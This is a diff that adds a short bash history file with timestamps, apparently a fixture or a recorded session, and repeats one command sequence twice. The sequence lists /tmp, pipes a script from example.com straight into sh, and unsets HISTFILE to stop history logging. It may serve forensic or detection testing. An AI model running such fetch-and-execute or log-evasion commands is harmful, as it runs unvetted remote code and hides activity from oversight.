@@ -1,0 +1,16 @@
+#1781318087
+ls -la /tmp
+#1781318087
+curl http://example.com/x.sh | sh
+#1781318087
+unset HISTFILE
+#1781318087
+  history -w
+#1781318087
+ls -la /tmp
+#1781318087
+curl http://example.com/x.sh | sh
+#1781318087
+unset HISTFILE
+#1781318087
+  history -w
